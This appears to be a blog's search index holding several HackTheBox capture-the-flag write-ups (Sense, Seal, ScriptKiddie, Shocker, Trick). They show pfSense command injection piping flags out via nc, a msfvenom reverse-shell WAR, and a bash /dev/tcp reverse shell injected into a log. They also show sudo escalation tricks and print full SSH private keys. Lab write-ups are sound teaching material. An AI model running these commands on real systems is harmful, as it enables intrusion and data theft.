Y4CIEv3lqgWFC34uJ/yrRHaVbIIaSOkuBi0h7Is562aoGp7/9Q3j/YUjKBtLvbvbNRxwM+sCWLasbK5xS7VvD569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nFJZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6zy0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U/gc1ljKcSEx262jXKHAG3mTTNKtooZAAAAwQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb/tWRBuM51v9ZXAlVUz14oKt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLMdFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0GhmXSlMvZVJEvlBISUVNM2YC+6hxh2Mc/0Szh0060qZv9ub3DXCDXMrwR5o6mdKv/kshpaD4Ml+fjgTzmOo/kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7/uqkiYfLdCJGoWkehGGxeplJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibcz04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP96urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7PlxhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3kfO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==-----END OPENSSH PRIVATE KEY-----Rooted!" }, { "title": "Sense writeup", "url": "/posts/Sense/", "categories": "Writeup, HackTheBox", "tags": "Easy-box", "date": "2022-07-04 17:00:00 +0200", "snippet": "SummaryThis box focuses on exploiting a pfsense, first through weak credentials and then via rce through the /status_rrd_graph_img.php? endpoint.Foothold and rootWe start out by doing an nmap port scan:┌──(bitis㉿workstation)-[~/Coding/BitisG.github.io]└─$ nmap -sC -sV 10.129.147.167Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 19:58 CESTNmap scan report for 10.129.147.167Host is up (0.024s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http lighttpd 1.4.35|_http-title: Did not follow redirect to https://10.129.147.167/|_http-server-header: lighttpd/1.4.35443/tcp open ssl/http lighttpd 1.4.35|_http-title: Login| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US| Not valid before: 2017-10-14T19:21:35|_Not valid after: 2023-04-06T19:21:35|_ssl-date: TLS randomness does not represent time|_http-server-header: lighttpd/1.4.35Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 22.50 secondsWhen visiting the application we are greeted with the following:After doing a scan with feroxbuster we find 2 interesting files: changelog.txt and system-users.txt:# Security Changelog ### IssueThere was a failure in updating the firewall. Manual patching is therefore required### Mitigated2 of 3 vulnerabilities have been patched.### TimelineThe remaining patches will be installed during the next maintenance window####Support ticket###Please create the following userusername: Rohitpassword: company defaultsBased on this information we can login as rohit with the credentials rohit:pfsense. A lot of vulnerabilities are present in pfsense. if we search the pfsense version for cve, we find a vulnerability, where apparently when using a get request on an image if we pass the query database, with value queues, we can simply do commands, like: GET /status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+home;cd+rohit;cat+user.txt|nc+10.10.17.182+1337 HTTP/1.1──(bitis㉿workstation)-[~/htb/Machines/sense]└─$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.63] from (UNKNOWN) [10.129.147.167] 250068721327cc232073b40d27d9c17e7348b And likewise for the root flag. Rooted!" }, { "title": "Seal writeup", "url": "/posts/Seal/", "categories": "Writeup, HackTheBox", "tags": "medium-box, git, tomcat", "date": "2022-07-04 15:00:00 +0200", "snippet": "SummaryThis box focused on bypassing authentication on a tomcat application, as well as git enumeration. We then pivot from the tomcat user after having successfully uploaded a malicious .war file via an ansible-playbook which copies symlinks. Root is achieved via a gtfobin.FootholdWe start out by doing an nmap port scan:Nmap scan report for 10.129.253.126Host is up (0.067s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)| 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)|_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)443/tcp open ssl/http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Seal Market| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK| Not valid before: 2021-05-05T10:24:03|_Not valid after: 2022-05-05T10:24:03| tls-alpn: |_ http/1.1| tls-nextprotoneg: |_ http/1.18080/tcp open http-proxy---SNIP---1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :---SNIP---Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.05 secondsPort 22, 443 and 8080 are open. If we check out the first web application hosted on port 8080 we are greeted with a GitBucket login page:After creating a user we gain access to 2 repositories, seal_market and infra. Browsing the seal_market repo, we find the earliest commit which adds tomcat configuration. Taking a look at the seal_market / tomcat / tomcat-users.xml file we find credentials for the tomcat application:While browsing we also find two new users, luis and alex. Doing a scan of the market application for tomcat specific endpoints we find the following:┌──(bitis㉿workstation)-[~/htb/Machines/Seal]└─$ feroxbuster -u https://seal.htb:443 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/tomcat.txt -k ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓 ver: 2.7.0───────────────────────────┬────────────────────── 🎯 Target Url │ https://seal.htb:443 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/SecLists/Discovery/Web-Content/tomcat.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────403 GET 7l 10w 162c https://seal.htb/manager/html403 GET 7l 10w 162c https://seal.htb/manager/html/*403 GET 7l 10w 162c https://seal.htb/host-manager/html/*200 GET 518l 1140w 19737c https://seal.htb/302 GET 0l 0w 0c https://seal.htb/host-manager =&amp;gt; http://seal.htb/host-manager/302 GET 0l 0w 0c https://seal.htb/manager =&amp;gt; http://seal.htb/manager/200 GET 84l 304w 4374c https://seal.htb/manager/status.xsd401 GET 63l 291w 2499c https://seal.htb/manager/status/*401 GET 63l 291w 2499c https://seal.htb/manager/jmxproxy401 GET 63l 291w 2499c https://seal.htb/manager/jmxproxy/*[####################] - 1s 182/182 0s found:10 errors:0 [####################] - 1s 91/91 76/s https://seal.htb:443 [####################] - 0s 91/91 100/s https://seal.htb/ We know that the server is using both nginx and tomcat based on the files found in GitBucket. Usually this means the application might be vulnerable to path normalization. If we visit the url https://seal.htb/admin;test=test/dashboard we get access to the the admin dashboard. We can also access the manager endpoint which allows us to upload .war files which we can use to obtain a reverse shell by uploading a malicious war file at the endpoint /shell, which when accessed will give us a reverse shell┌──(bitis㉿workstation)-[~/htb/Machines/Seal]└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.63 LPORT=4444 -f war -o shell.warPayload size: 1097 bytesFinal size of war file: 1097 bytesSaved as: shell.warWe can then upload it by using the url https://seal.htb/manager/test/..;/html/?upload= which again is used to bypass authentication system used. WE intercept the request in burp and mofify the endpoint:When browsing to /shell we get a reverse shell:┌──(bitis㉿workstation)-[~]└─$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.10.14.63] from (UNKNOWN) [10.129.95.190] 43862iduid=997(tomcat) gid=997(tomcat) groups=997(tomcat)PivotIf we go to /opt/backups we find the following file:- hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: &quot;/opt/backups/archives/backup--.gz&quot; - name: Clean file: state: absent path: /opt/backups/files/This file copies everything in the /var/lib/tomcat9/webapps/ROOT/admin/dashboard directory with the argument copy_links=yes. This argument means that files that symlinks point towards are copied, not the symlinks themselves.cd /opt/backups/archivesls -altotal 1784drwxrwxr-x 2 luis luis 4096 Jul 4 17:32 .drwxr-xr-x 4 luis luis 4096 Jul 4 17:32 ..-rw-rw-r-- 1 luis luis 606047 Jul 4 17:30 backup-2022-07-04-17:30:32.gz-rw-rw-r-- 1 luis luis 606047 Jul 4 17:31 backup-2022-07-04-17:31:32.gz-rw-rw-r-- 1 luis luis 606047 Jul 4 17:32 backup-2022-07-04-17:32:32.gzIt seems like the luis user is running the playbook every minute. We can add a symlink to the /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads directory.cd /var/lib/tomcat9/webapps/ROOT/admin/dashboardln -s /home/luis/.ssh/id_rsa uploads/keyscd /opt/backups/archivesls -al total 1788drwxrwxr-x 2 luis luis 4096 Jul 4 17:37 .drwxr-xr-x 4 luis luis 4096 Jul 4 17:37 ..-rw-rw-r-- 1 luis luis 606047 Jul 4 17:35 backup-2022-07-04-17:35:33.gz-rw-rw-r-- 1 luis luis 606047 Jul 4 17:36 backup-2022-07-04-17:36:32.gz-rw-rw-r-- 1 luis luis 608922 Jul 4 17:37 backup-2022-07-04-17:37:32.gzcp backup-2022-07-04-17:37:32.gz /tmpWe can then unzip the archive and read the ssh key of the luis user:-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----Privilege escalationOnce logged in as luis we run sudo -l:luis@seal:~$ sudo -lMatching Defaults entries for luis on seal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser luis may run the following commands on seal: (ALL) NOPASSWD: /usr/bin/ansible-playbook *luis@seal:~$ On gtfobins we find a straightforward way to exploit our sudo rights to the ansible-playbook binary.luis@seal:~$ TF=$(mktemp)luis@seal:~$ echo &#39;[{hosts: localhost, tasks: [shell: /bin/sh &amp;lt;/dev/tty &amp;gt;/dev/tty 2&amp;gt;/dev/tty]}]&#39; &amp;gt;$TFluis@seal:~$ sudo /usr/bin/ansible-playbook $TF[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match &#39;all&#39;PLAY [localhost] ***************************************************************************************************************************************************************************************************************************TASK [Gathering Facts] *********************************************************************************************************************************************************************************************************************ok: [localhost]TASK [shell] *******************************************************************************************************************************************************************************************************************************# iduid=0(root) gid=0(root) groups=0(root)# Rooted!" }, { "title": "Scriptkiddie writeup", "url": "/posts/ScriptKiddie/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, metasploit", "date": "2022-07-02 15:00:00 +0200", "snippet": "SummaryThis box is centered around command injection in a bash script, an exploit in msfvenom, and exploiting metasploit into getting a root shell. Let’s take a look.FootholdWe start out by doing an nmap port scan:┌──(bitis㉿workstation)-[~/htb/Machines/ScriptKiddie]└─$ nmap -sC -sV 10.129.95.150Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 15:57 CESTNmap scan report for 10.129.95.150Host is up (0.023s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)| 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)|_ 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5)|_http-title: k1d&#39;5 h4ck3r t00l5Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.42 secondsIf we go to the web application hosted on port 8000 we are greeted with a very basic page that allows us to work with nmap, searchsploit and msfvenom. Looking up exploits we find the following exploit for msfvenom which gives us RCE on the target system.We can use the exploit to produce a malicious apk template file for msfvenom. We then setup a listener and get a reverse shell on the system.┌──(bitis㉿workstation)-[~/htb/Machines/ScriptKiddie]└─$ nc -lvnp 1337listening on [any] 1337 ...connect to [10.10.14.31] from (UNKNOWN) [10.129.95.150] 51500id uid=1000(kid) gid=1000(kid) groups=1000(kid)PivotReading /etc/password we find another user named pwn:kid@scriptkiddie:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsesshd:x:111:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsekid:x:1000:1000:kid:/home/kid:/bin/bashpwn:x:1001:1001::/home/pwn:/bin/bashIn the users home directory we find a readable script, seen below:#!/bin/bashlog=/home/kid/logs/hackerscd /home/pwn/cat $log | cut -d&#39; &#39; -f3- | sort -u | while read ip; do sh -c &quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null&quot; &amp;amp;doneif [[ $(wc -l &amp;lt; $log) -gt 0 ]]; then echo -n &amp;gt; $log; fiThe script reads from a file located in the kid users home directory. The script uses a space as a seperator, and the third field is read and used in the script as the variable ip. We can use this to inject commands in the script obtaining a reverse shell as the pwn user: kid@scriptkiddie:~/logs$ echo &#39;a b $(bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.31/1337 0&amp;gt;&amp;amp;1&quot;)&#39; &amp;gt;&amp;gt; hackers┌──(bitis㉿workstation)-[~/htb/Machines/ScriptKiddie]└─$ nc -lvnp 1337listening on [any] 1337 ...connect to [10.10.14.31] from (UNKNOWN) [10.129.95.150] 51688bash: cannot set terminal process group (862): Inappropriate ioctl for devicebash: no job control in this shellpwn@scriptkiddie:~$ Privilege escalationRunning sudo -l we can see that we can run metasploit as sudo without a password:pwn@scriptkiddie:~$ sudo -lsudo -lMatching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsoleWhile in metasploit we can start an interactive ruby session with the irb command, which we can then use to spawn a bash shell:sf6 &amp;gt; irbstty: &#39;standard input&#39;: Inappropriate ioctl for device[*] Starting IRB shell...[*] You are in the &quot;framework&quot; objectsystem(&quot;/bin/bash&quot;)Switch to inspect mode.irb: warn: can&#39;t alias jobs from irb_jobs.&amp;gt;&amp;gt; system(&quot;/bin/bash&quot;)iduid=0(root) gid=0(root) groups=0(root)Rooted!" }, { "title": "Shocker writeup", "url": "/posts/Shocker/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, metasploit", "date": "2022-07-02 13:00:00 +0200", "snippet": "SummaryA straightforward box showcasing the shellshock vulnerability with a simple root step. Enjoy!FootholdWe start out by doing an nmap port scan:┌──(bitis㉿workstation)-[~/htb/Machines/Shocker]└─$ nmap -sC -sV 10.129.1.175 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 18:11 CESTNmap scan report for 10.129.1.175Host is up (0.023s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.09 secondsVisiting the web application hosted via port 80 we are greeted with the following doodle of a bug:The site is otherwise very bare. Doing a scan with feroxbuster we find the cgi-bin directory.┌──(bitis㉿workstation)-[~/htb/Machines/Shocker]└─$ feroxbuster -u http://10.129.1.175/ -r -x php js html pdf -B -w /usr/share/wordlists/dirb/common.txt 1 ⨯ ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher 🤓 ver: 2.7.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.129.1.175/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirb/common.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, js, html, pdf] 🏦 Collect Backups │ true 🏁 HTTP methods │ [GET] 📍 Follow Redirects │ true 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────200 GET 9l 13w 137c http://10.129.1.175/403 GET 11l 32w 296c http://10.129.1.175/.htpasswd403 GET 11l 32w 297c http://10.129.1.175/.htpasswd~403 GET 11l 32w 300c http://10.129.1.175/.htpasswd.bak403 GET 11l 32w 301c http://10.129.1.175/.htpasswd.bak2403 GET 11l 32w 300c http://10.129.1.175/.htpasswd.old403 GET 11l 32w 298c http://10.129.1.175/.htpasswd.1403 GET 11l 32w 296c http://10.129.1.175/.htaccess---SNIP---403 GET 11l 32w 312c http://10.129.1.175/cgi-bin/.htpasswd.pdf.bak403 GET 11l 32w 313c http://10.129.1.175/cgi-bin/.htpasswd.pdf.bak2403 GET 11l 32w 312c http://10.129.1.175/cgi-bin/.htpasswd.pdf.old403 GET 11l 32w 310c http://10.129.1.175/cgi-bin/.htpasswd.pdf.1200 GET 9l 13w 137c http://10.129.1.175/index.html403 GET 11l 32w 300c http://10.129.1.175/server-status[####################] - 15s 46369/46369 0s found:196 errors:0 [####################] - 13s 23070/23070 1754/s http://10.129.1.175/ [####################] - 13s 23070/23070 1774/s http://10.129.1.175/cgi-bin/Searching for an exploit related to this directory, we quickly find about about shellshock, a vulnerability which can be used to gain code execution on the target system. More info can be found here. The exploit can be used to gain a foothold on the system.msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &amp;gt; set TARGETURI /cgi-bin/user.shTARGETURI =&amp;gt; /cgi-bin/user.shmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &amp;gt; run[*] Started reverse TCP handler on 10.10.14.31:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes)[*] Sending stage (989032 bytes) to 10.129.1.175[*] Meterpreter session 1 opened (10.10.14.31:4444 -&amp;gt; 10.129.1.175:41436) at 2022-07-02 18:29:44 +0200meterpreter &amp;gt; getuidServer username: shellymeterpreter &amp;gt; shellProcess 1737 created.Channel 1 created.iduid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)sudo -lMatching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perlPrivilege escalationTo gain root on the system we need to exploit that we can run perl as root. See here for more information.sudo /usr/bin/perl -e &#39;exec &quot;/bin/sh&quot;;&#39;iduid=0(root) gid=0(root) groups=0(root)Rooted!" }, { "title": "Trick writeup", "url": "/posts/Trick/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, enumeration, dns", "date": "2022-06-27 16:00:00 +0200", "snippet": "SummaryThis was a slightly tricky easy-box. It requires a lot of enumeration and even a custom wordlist. The foothold is pretty straightforward however, utilizing an LFI vulnerability to gain an ssh key. Privilege escalation is likewise pretty straightforward given the right blogposts.FootholdWe start out with a nmap port scan┌──(bitis㉿workstation)-[~/htb/Machines/trick]└─$ nmap -sC -sV -p- 10.129.80.75 -o nmap/full.txtStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-27 21:04 CESTNmap scan report for 10.129.80.75Host is up (0.021s latency).Not shown: 65531 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)| 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)|_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)25/tcp open smtp?|_smtp-commands: Couldn&#39;t establish connection on port 2553/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)| dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian80/tcp open http nginx 1.14.2|_http-title: Coming Soon - Start Bootstrap Theme|_http-server-header: nginx/1.14.2Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 309.18 secondsThe systm has 4 ports open. 22, 25, 53 and 80. If we check out the website we realize it is extremely barren.After looking around for a while we realize nothing really interesting is happening here. What we realize is that on port 53 the box is hosting a DNS service. I tried enumerating vhosts and the like with gobuster, but didn’t find anything interesting. While the scan didn’t work, we can use dig to query the DNS service on the system. We 